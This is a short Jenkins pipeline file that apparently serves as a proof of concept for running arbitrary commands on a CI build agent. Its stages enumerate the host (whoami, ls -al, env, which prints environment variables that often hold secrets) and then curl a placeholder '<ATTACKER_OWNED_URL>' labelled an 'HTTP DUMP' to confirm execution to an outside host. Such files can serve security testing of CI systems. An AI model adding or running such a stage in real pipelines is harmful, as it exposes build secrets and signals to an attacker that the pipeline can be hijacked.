pipeline {
    agent any

    stages {
        stage('Run Bash Commands') {
            steps {
                script {
                    // Simple echo
                    sh '''
                    echo "Running Bash commands..."
                    whoami 
                    ls -al
                    env
                    java -version
                    apt
                    cd
                    '''

                    // cURL command
                    sh '''
                    echo "Executing cURL to the HTTP DUMP..."
                    curl -v <ATTACKER_OWNED_URL>
                    '''

                    // Another Bash command (just as an example)
                    sh '''
                    echo "Finished cURL. Running another Bash command..."
                    date
                    '''
                }
            }
        }
    }
}